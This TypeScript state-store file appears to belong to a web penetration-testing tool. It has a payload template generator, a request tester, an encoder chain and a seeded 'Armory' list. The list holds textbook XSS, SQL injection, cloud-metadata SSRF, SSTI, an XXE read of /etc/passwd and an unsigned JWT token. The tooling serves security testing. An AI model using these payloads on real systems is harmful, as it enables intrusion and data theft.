import { create } from 'zustand'

export type Module = 'forge' | 'workshop' | 'armory' | 'crucible' | 'labyrinth'
export type TyphonStatus = 'offline' | 'connecting' | 'online'

// ── Forge ─────────────────────────────────────────────────────────────────────

export interface ForgeTemplate {
  id: string
  name: string
  category: string
  template: string
  variables: Record<string, string>
}

export const FORGE_TEMPLATES: ForgeTemplate[] = [
  {
    id: 'xss-basic',
    name: 'XSS Basic',
    category: 'XSS',
    template: '<img src={{INVALID_SRC}} onerror={{HANDLER}}>',
    variables: { INVALID_SRC: 'x', HANDLER: 'alert(document.domain)' },
  },
  {
    id: 'sqli-union',
    name: 'SQLi UNION',
    category: 'SQLi',
    template: "' UNION SELECT {{COL1}},{{COL2}},{{COL3}} FROM {{TABLE}}--",
    variables: { COL1: 'null', COL2: 'null', COL3: 'null', TABLE: 'users' },
  },
  {
    id: 'ssrf-internal',
    name: 'SSRF Internal',
    category: 'SSRF',
    template: 'http://{{HOST}}:{{PORT}}/{{PATH}}',
    variables: { HOST: '169.254.169.254', PORT: '80', PATH: 'latest/meta-data/' },
  },
]

interface ForgeState {
  selectedTemplateId: string
  variables: Record<string, string>
  generatedPayload: string
  setSelectedTemplate: (id: string) => void
  setVariable: (key: string, value: string) => void
}

// ── Armory ────────────────────────────────────────────────────────────────────

export interface ArmoryPayload {
  id: string
  name: string
  category: string
  severity: 'low' | 'medium' | 'high' | 'critical'
  favorite: boolean
  content: string
}

const INITIAL_PAYLOADS: ArmoryPayload[] = [
  { id: '1', name: 'IMG OnError Basic',        category: 'xss',  severity: 'medium',   favorite: true,  content: '<img src=x onerror=alert(document.domain)>' },
  { id: '2', name: 'DOM Clobbering v2',        category: 'xss',  severity: 'high',     favorite: false, content: '<form id=x><output id=y>clobber</output></form>' },
  { id: '3', name: 'UNION SELECT 5-col',       category: 'sqli', severity: 'critical', favorite: false, content: "' UNION SELECT null,null,null,null,null--" },
  { id: '4', name: 'Blind SSRF OOB',           category: 'ssrf', severity: 'high',     favorite: true,  content: 'http://169.254.169.254/latest/meta-data/' },
  { id: '5', name: "Jinja2 RCE {{7*7}}",       category: 'ssti', severity: 'critical', favorite: false, content: '{{7*7}}' },
  { id: '6', name: 'XXE File Read /etc/passwd', category: 'xxe', severity: 'high',     favorite: false, content: '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY f SYSTEM "file:///etc/passwd">]><x>&f;</x>' },
  { id: '7', name: 'IDOR UUID Predict',        category: 'idor', severity: 'medium',   favorite: false, content: 'GET /api/user/00000000-0000-0000-0000-000000000001' },
  { id: '8', name: 'JWT None Algorithm',       category: 'auth', severity: 'critical', favorite: true,  content: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0In0.' },
]

interface ArmoryState {
  payloads: ArmoryPayload[]
  searchQuery: string
  selectedId: string | null
  setSearchQuery: (q: string) => void
  setSelectedId: (id: string | null) => void
  deletePayload: (id: string) => void
  addPayload: (payload: ArmoryPayload) => void
}

// ── Crucible ──────────────────────────────────────────────────────────────────

export interface CrucibleResponse {
  status: number
  statusText: string
  headers: Record<string, string>
  body: string
  durationMs: number
  sizeBytes: number
  error?: string
}

interface CrucibleState {
  url: string
  method: string
  headers: string
  body: string
  response: CrucibleResponse | null
  loading: boolean
  setUrl: (v: string) => void
  setMethod: (v: string) => void
  setHeaders: (v: string) => void
  setBody: (v: string) => void
  setResponse: (r: CrucibleResponse | null) => void
  setLoading: (v: boolean) => void
}

// ── Labyrinth ─────────────────────────────────────────────────────────────────

export interface LabyrinthStep {
  id: string
  encoder: string
}

interface LabyrinthState {
  chainSteps: LabyrinthStep[]
  input: string
  output: string
  setInput: (v: string) => void
  setOutput: (v: string) => void
  addStep: (encoder: string) => void
  removeStep: (id: string) => void
  moveStep: (id: string, direction: 'up' | 'down') => void
}

// ── App ───────────────────────────────────────────────────────────────────────

interface AppState {
  activeModule: Module
  typhonStatus: TyphonStatus
  payloadCount: number
  setActiveModule: (module: Module) => void
  setTyphonStatus: (status: TyphonStatus) => void
  setPayloadCount: (count: number) => void
}

// ── Helpers ───────────────────────────────────────────────────────────────────

function buildPayload(template: string, variables: Record<string, string>): string {
  return template.replace(/{{(\w+)}}/g, (_, key) => variables[key] ?? `{{${key}}}`)
}

function generateId() {
  return Math.random().toString(36).slice(2, 10)
}

// ── Stores ────────────────────────────────────────────────────────────────────

export const useAppStore = create<AppState>((set) => ({
  activeModule: 'forge',
  typhonStatus: 'offline',
  payloadCount: INITIAL_PAYLOADS.length,
  setActiveModule: (module) => set({ activeModule: module }),
  setTyphonStatus: (status) => set({ typhonStatus: status }),
  setPayloadCount: (count) => set({ payloadCount: count }),
}))

const initialTemplate = FORGE_TEMPLATES[0]

export const useForgeStore = create<ForgeState>((set) => ({
  selectedTemplateId: initialTemplate.id,
  variables: { ...initialTemplate.variables },
  generatedPayload: buildPayload(initialTemplate.template, initialTemplate.variables),
  setSelectedTemplate: (id) => {
    const tmpl = FORGE_TEMPLATES.find((t) => t.id === id) ?? FORGE_TEMPLATES[0]
    set({
      selectedTemplateId: id,
      variables: { ...tmpl.variables },
      generatedPayload: buildPayload(tmpl.template, tmpl.variables),
    })
  },
  setVariable: (key, value) =>
    set((state) => {
      const tmpl = FORGE_TEMPLATES.find((t) => t.id === state.selectedTemplateId) ?? FORGE_TEMPLATES[0]
      const updated = { ...state.variables, [key]: value }
      return { variables: updated, generatedPayload: buildPayload(tmpl.template, updated) }
    }),
}))

export const useArmoryStore = create<ArmoryState>((set) => ({
  payloads: INITIAL_PAYLOADS,
  searchQuery: '',
  selectedId: INITIAL_PAYLOADS[0].id,
  setSearchQuery: (q) => set({ searchQuery: q }),
  setSelectedId: (id) => set({ selectedId: id }),
  deletePayload: (id) =>
    set((state) => {
      const payloads = state.payloads.filter((p) => p.id !== id)
      const selectedId = state.selectedId === id ? (payloads[0]?.id ?? null) : state.selectedId
      return { payloads, selectedId }
    }),
  addPayload: (payload) =>
    set((state) => ({
      payloads: [...state.payloads, { ...payload, id: generateId() }],
    })),
}))

export const useCrucibleStore = create<CrucibleState>((set) => ({
  url: 'https://httpbin.org/get?q=',
  method: 'GET',
  headers: 'Content-Type: application/json',
  body: '',
  response: null,
  loading: false,
  setUrl: (v) => set({ url: v }),
  setMethod: (v) => set({ method: v }),
  setHeaders: (v) => set({ headers: v }),
  setBody: (v) => set({ body: v }),
  setResponse: (r) => set({ response: r }),
  setLoading: (v) => set({ loading: v }),
}))

export const useLabyrinthStore = create<LabyrinthState>((set) => ({
  chainSteps: [
    { id: '1', encoder: 'url-encode' },
    { id: '2', encoder: 'base64-encode' },
  ],
  input: 'alert(document.domain)',
  output: '',
  setInput: (v) => set({ input: v }),
  setOutput: (v) => set({ output: v }),
  addStep: (encoder) =>
    set((state) => ({
      chainSteps: [...state.chainSteps, { id: generateId(), encoder }],
    })),
  removeStep: (id) =>
    set((state) => ({ chainSteps: state.chainSteps.filter((s) => s.id !== id) })),
  moveStep: (id, direction) =>
    set((state) => {
      const arr = [...state.chainSteps]
      const idx = arr.findIndex((s) => s.id === id)
      if (idx === -1) return {}
      const swapIdx = direction === 'up' ? idx - 1 : idx + 1
      if (swapIdx < 0 || swapIdx >= arr.length) return {}
      ;[arr[idx], arr[swapIdx]] = [arr[swapIdx], arr[idx]]
      return { chainSteps: arr }
    }),
}))
